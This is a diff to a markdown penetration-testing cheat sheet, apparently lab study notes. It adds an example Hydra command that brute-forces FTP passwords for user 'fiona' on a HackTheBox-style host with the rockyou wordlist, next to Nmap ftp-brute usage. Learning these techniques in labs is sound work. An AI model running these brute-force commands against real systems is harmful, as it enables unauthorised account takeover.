@@ -42,6 +42,11 @@ ftp X.X.X.X
 ```BASH
 hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ftp://X.X.X.X
 ```
+
+##### Example:
+```
+hydra inlanefreight.htb -l fiona -P /usr/share/wordlists/rockyou.txt ftp -t 64
+```
 - It is also possible to perform brute force on FTP with `Nmap` scripts:
 ```BASH
 nmap -p 21 --script ftp-brute X.X.X.X
